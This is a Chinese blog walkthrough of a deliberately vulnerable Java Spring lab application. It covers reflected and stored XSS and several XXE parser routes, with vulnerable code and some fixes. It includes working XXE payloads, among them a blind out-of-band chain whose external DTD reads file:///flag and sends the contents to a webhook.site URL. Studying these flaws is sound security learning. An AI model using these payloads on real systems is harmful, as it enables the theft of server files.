<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/reflect"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">reflect</span><span class="token punctuation">(</span><span class="token class-name">String</span> xss<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">return</span> xss<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>秒了，直接返回到页面直接 script 标签了<img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131617709.png" alt="image-20250713161737624" /></p>
<h3 id="2路由xssstored"><a class="anchor" href="#2路由xssstored">#</a> 2. 路由 /xss/stored</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 先存储在 cookie 中</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/stored/store"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token class-name">String</span> xss<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">Cookie</span> cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">,</span> xss<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"Set param into cookie"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">// 将 cookie 中的路由展示出来</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/stored/show"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> xss<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> xss<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="xss攻击防护"><a class="anchor" href="#xss攻击防护">#</a> XSS 攻击防护：</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/safe"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token class-name">String</span> xss<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">encode</span><span class="token punctuation">(</span>xss<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">String</span> origin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#x27;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#x2F;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">return</span> origin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>将尖括号过滤就差不多了</p>
<h2 id="xxe"><a class="anchor" href="#xxe">#</a> XXE</h2>
<h3 id="1路由xxexmlreadervuln"><a class="anchor" href="#1路由xxexmlreadervuln">#</a> 1. 路由 /xxe/xmlReader/vuln</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/xmlReader/vuln"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">xmlReaderVuln</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token class-name">XMLReader</span> xmlReader <span class="token operator">=</span> <span class="token class-name">XMLReaderFactory</span><span class="token punctuation">.</span><span class="token function">createXMLReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            xmlReader<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// parse xml</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"xmlReader xxe vuln code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="2路由xxesaxbuildervuln"><a class="anchor" href="#2路由xxesaxbuildervuln">#</a> 2. 路由 /xxe/SAXBuilder/vuln</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">SAXBuilderVuln</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token class-name">SAXBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token comment">// org.jdom2.Document document</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cause xxe</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"SAXBuilder xxe vuln code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>换用 SAXReader 第三方库，攻击手法同上：</p>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131638014.png" alt="image-20250713163801721" /></p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131638654.png" alt="image-20250713163814551" /></p>
<p>只能用来读文件，而且还不回显，有点难受</p>
<h4 id="修复代码"><a class="anchor" href="#修复代码">#</a> 修复代码：</h4>
<p>竟然都是外部实体造成的问题，直接禁用就好了</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/sec"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">SAXBuilderSec</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token class-name">SAXBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-general-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-parameter-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token comment">// org.jdom2.Document document</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"SAXBuilder xxe security code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="3路由xxesaxreadervuln"><a class="anchor" href="#3路由xxesaxreadervuln">#</a> 3. 路由 /xxe/SAXReader/vuln</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">SAXBuilderVuln</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token class-name">SAXBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token comment">// org.jdom2.Document document</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cause xxe</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"SAXBuilder xxe vuln code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload 一样，也是没有任何防御，该类有回显</p>
<h3 id="通用的做法"><a class="anchor" href="#通用的做法">#</a> 通用的做法：</h3>
<h4 id="external-dtd外部-dtd-参数实体parameter-entity实现的-blind-xxe-外带攻击"><a class="anchor" href="#external-dtd外部-dtd-参数实体parameter-entity实现的-blind-xxe-外带攻击">#</a> External DTD（外部 DTD）+ 参数实体（Parameter Entity）实现的 Blind XXE 外带攻击</h4>
<p>在主 xml 里面写：</p>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0"?></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset"></pre></td></tr><tr><td data-num="3"></td><td><pre>  &lt;!ENTITY % dtd SYSTEM "http://192.168.159.1:8000/1.dtd"></pre></td></tr><tr><td data-num="4"></td><td><pre>  %dtd;</pre></td></tr><tr><td data-num="5"></td><td><pre></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>在这个服务器上起一个 http 服务：</p>
<pre><code>python -m http.server 8000
</code></pre>
<p>然后再起的服务下面创建一个 dtd 文件，在 dtd 文件里面搞一个</p>
<pre><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'https://webhook.site/9181b45a-e69a-4ca5-8424-f3f6888ddf8e?d=%file;'&gt;&quot;&gt;
%all;
</code></pre>
<p>xml 这个东西感觉可以学学</p>
<p>感觉都差不多，直接发送请求</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507181631168.png" alt="image-20250718163104944" /></p>
<p>看一下有没有外带数据，有了</p>
<p><img data-src="C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250718162847835.png" alt="image-20250718162847835" /></p>
<h3 id="4路由xxesaxparservuln"><a class="anchor" href="#4路由xxesaxparservuln">#</a> 4. 路由 /xxe/SAXParser/vuln</h3>
<p>漏洞代码：</p>
<pre><code>  @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return &quot;SAXParser xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
java复制代码12345678910111213141516
</code></pre>
<h3 id="5路由xxedigestervuln"><a class="anchor" href="#5路由xxedigestervuln">#</a> 5. 路由 /xxe/Digester/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
        return &quot;Digester xxe vuln code&quot;;
    &#125;
java复制代码1234567891011121314
</code></pre>
<h3 id="6路由xxedocumentbuildervuln"><a class="anchor" href="#6路由xxedocumentbuildervuln">#</a> 6. 路由 /xxe/DocumentBuilder/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)
    public String DocumentBuilderVuln(HttpServletRequest request) &#123;
        try &#123;
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            InputSource is = new InputSource(request.getInputStream());
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j &lt; child.getLength(); j++) &#123;
                    Node node = child.item(j);
                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));
                &#125;
            &#125;
            return buf.toString();
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
            logger.error(e.toString());
            return e.toString();
        &#125;
    &#125;
java复制代码1234567891011121314151617181920212223242526
</code></pre>
<p>这是 JDK 自带的类，以此产生的 XXE 是存在回显的</p>
<h3 id="7路由xxedocumentbuilderxincludevuln"><a class="anchor" href="#7路由xxedocumentbuilderxincludevuln">#</a> 7. 路由 /xxe/DocumentBuilder/xinclude/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
Java复制代码123456789101112131415161718192021222324
</code></pre>
<h3 id="8路由xxexmlreadervuln"><a class="anchor" href="#8路由xxexmlreadervuln">#</a> 8. 路由 /xxe/XMLReader/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@PostMapping(&quot;/XMLReader/vuln&quot;)
    public String XMLReaderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;XMLReader xxe vuln code&quot;;
    &#125;
java复制代码123456789101112131415161718
</code></pre>
<h3 id="9路由xxedocumenthelpervuln"><a class="anchor" href="#9路由xxedocumenthelpervuln">#</a> 9. 路由 /xxe/DocumentHelper/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@PostMapping(&quot;/DocumentHelper/vuln&quot;)
    public String DocumentHelper(HttpServletRequest req) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;DocumentHelper xxe vuln code&quot;;
    &#125;


    private static void response(NodeList rootNodeList)&#123;
